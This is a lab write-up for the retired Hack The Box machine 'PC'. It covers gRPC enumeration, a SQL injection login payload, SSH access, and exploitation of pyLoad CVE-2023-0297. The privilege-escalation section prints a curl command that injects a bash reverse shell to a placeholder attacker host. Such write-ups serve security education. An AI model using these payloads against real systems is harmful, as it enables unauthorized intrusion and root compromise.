---
machine: PC
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, grpc, sqli, pyload, cve, privesc]
---

# PC — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Port 50051 is gRPC with reflection enabled. `grpcurl` enumerates a login service and an injectable SQLite query that yields `sau` credentials. SSH reaches the host; pyLoad 0.4.20 listens on localhost and is vulnerable to CVE-2023-0297, allowing command execution as root.

## Recon

```bash
nmap -Pn -sCV -p22,50051 <IP>
```

- `22` SSH and `50051` an unknown service.
- `grpcurl -plaintext <IP>:50051 list` confirms gRPC and reflection.
- The service is `PC` and exposes login and query methods.

## Enumeration

- `grpcurl describe` shows `LoginRequest`, `Token` and `GetInfo`.
- The login `username` is concatenated into a SQLite query.
- An injection with `' OR 1=1--` returns a token and user data.

```bash
grpcurl -plaintext <IP>:50051 list
grpcurl -plaintext -d '{"username":"admin'\'' OR 1=1--","password":"x"}' <IP>:50051 pc.PC/Login
```

## Foothold

Enumerate tables with the token and recover `sau`'s hash. Crack it and use the credentials over SSH.

```bash
grpcurl -plaintext -H 'token: <TOKEN>' -d '{"username":"sau"}' <IP>:50051 pc.PC/GetInfo
ssh sau@<IP>
```

## Lateral movement

`ss -tlnp` shows pyLoad on `127.0.0.1:8000`. Version 0.4.20 is vulnerable to CVE-2023-0297 in `js2py`.

```bash
ssh -L 8000:127.0.0.1:8000 sau@<IP>
```

## Privilege escalation

The `flash/addcrypted2` endpoint evaluates `jk` with `pyimport`; inject a reverse shell and pyLoad runs it as root.

```bash
curl -s 'http://127.0.0.1:8000/flash/addcrypted2' --data-urlencode 'jk=pyimport("os").system("bash -c \\"bash -i >& /dev/tcp/<ATTACKER>/443 0>&1\\"")'
```

## Evidence

- gRPC reflection and enumerated methods.
- Login SQLi and `sau` credentials.
- pyLoad on localhost and CVE-2023-0297.
- Reverse shell as root.

## Lessons learned

- Unauthenticated gRPC exposes contracts and internal queries.
- SQLi in a light service can yield system credentials.
- An old local service can be the only path to root.

## Mitigation and detection

- Require authentication and disable reflection in production.
- Parameterize queries and validate gRPC messages.
- Update pyLoad and do not run it as root.

## References

- [0xdf — PC](https://0xdf.gitlab.io/2023/10/07/htb-pc.html)
- [IppSec — PC](https://www.youtube.com/watch?v=AQSLvalzW8g)
- [Hack The Box — PC](https://app.hackthebox.com/machines/pc)
